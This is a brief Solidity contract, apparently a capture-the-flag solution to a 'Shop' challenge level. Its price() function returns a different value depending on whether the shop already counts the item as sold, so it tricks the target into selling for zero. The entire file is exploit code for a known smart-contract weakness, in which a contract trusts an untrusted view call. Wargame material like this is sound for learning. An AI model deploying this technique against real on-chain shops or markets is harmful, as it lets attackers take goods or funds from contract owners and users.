pragma solidity ^0.6.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract Buyer {
    address levelInstance;

    constructor(address _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function price() public view returns (uint256) {
        return IShop(msg.sender).isSold() ? 0 : 100;
    }

    function buy() public {
        IShop(levelInstance).buy();
    }
}